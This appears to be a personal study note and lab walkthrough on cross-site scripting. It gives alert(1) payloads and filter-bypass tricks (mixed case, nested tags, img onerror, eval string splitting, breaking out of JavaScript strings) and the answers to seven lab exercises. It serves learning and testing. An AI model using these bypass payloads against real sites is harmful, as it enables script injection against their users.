# XSS

Cross-site scripting is a type of security vulnerability that can be found in some web applications. XSS attacks enable attackers to 
inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access 
controls such as the same-origin policy

## Type OF XSS

1. Stored XSS 
2. Reflected XSS 
3. DOM-based XSS
4. XSS Discovery and Prevention

## Note 

Check source code and add paylods check which type of error and block word and bypass

1. Open source code and enter paylods in urls like <script>alert(1)</script> script reflecte like

    alert(1)!</p>
       
So script word is block so modify script word and try bypass use this paylods 

    <sCript>alert(1)</sCRIpt> 
    
This paylods enter the urls and check source code  

     <sCript>alert(1)</sCRIpt>!</p>
     
This is Vulnerablity

2. Open source code and enter paylods in urls like <script>alert(1)</script> script so error message script is complect block use HTML code like

        <img src='zzzz' onerror='alert(1)' />
        
3. Open source code and enter paylods in urls like <script>alert(1)</script> script so error try onlyfor script bedaut alert(1) <script></script> check source code like 

       <script></script>!</p>
       
So alert word is block try modify alert and try to bypass

    <script>eval("al"%2b"ert(1)")</script>

4. Open source code and enter paylods in urls like <script>alert(1)</script> script reflected in source code like 

       <script>
              var $a= "<script>alert(1)</script>";
        </script>
       
     
 Pylods in JavaScript code bypass using // or by adding some dummy code (var $dummy = ") to close it correctly.

     </script><script>alert(1)</script> 
     
Use This paylods and check the source code 

     <script>
       var $a= " </script><script>alert(1)</script>";
     </script>
                 
Boom bypass simple use dummy code 

5. Open source code and enter paylods in urls like <script>alert(1)</script> script reflected in source code like 

       <script>
         var $a= ' &lt;script&gt;alert(1)&lt;/script&gt;';
       </script>

you won't be Want to use special characters, This issue is common in PHP web applications, because the well-known function used to HTML-encode characters (htmlentities) does not encode single quotes ('), unless you told it to do so, using the ENT_QUOTES flag. like 

     ';alert(1);'


# LAB

## XSS 01

This exercise is simpel Cross-Site Scripting challange

    <script>alert(1)</script>

## XSS 02

    <sCript>alert(1)</sCRIpt> 
    
## XSS 03

Script is block so use the paylods

    <scr<script>ipt>alert(1)</scr</script>ipt>


## XSS 04

completely block the word script 

    <img src='zzzz' onerror='alert(1)' />

## XSS 05 

block alert word so modify and bypass

    <script>eval("al"%2b"ert(1)")</script>

## XSS 06

Here, reflect var $a= "asifkhan"; so bracke the "" 

    </script><script>alert(1)</script>

## XSS 07

Reflect 'asifkha' single coten so breck the single ''

    ';alert(1);'
